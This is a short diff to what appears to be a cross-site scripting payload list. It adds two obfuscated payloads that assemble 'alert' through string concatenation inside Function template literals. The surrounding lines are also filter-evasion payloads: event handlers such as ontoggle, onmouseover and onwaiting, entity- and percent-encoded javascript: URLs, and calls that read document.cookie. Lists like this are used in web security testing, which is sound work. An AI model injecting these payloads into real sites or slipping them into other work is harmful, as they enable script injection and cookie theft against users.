@@ -10,6 +10,8 @@
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 <a href=java%26%23x0Dscript%26%230000058alert(document%26%230000046cookie%26%230000041>search
+test ‘-Function`self[‘a’\x2b’l’\x2b’e’\x2b’r’\x2b’t’]\x281\x29```-’
+test ‘-Function`self[‘a’+’l’+’e’+’r’+’t’](1)```-’
 <a%2Fonmouseover%3D(confirm)(document.URL)>a
 <a href=javascript:origin>CLICK
 <audio controls onwaiting=alert(1)><source src=x type=x></audio>
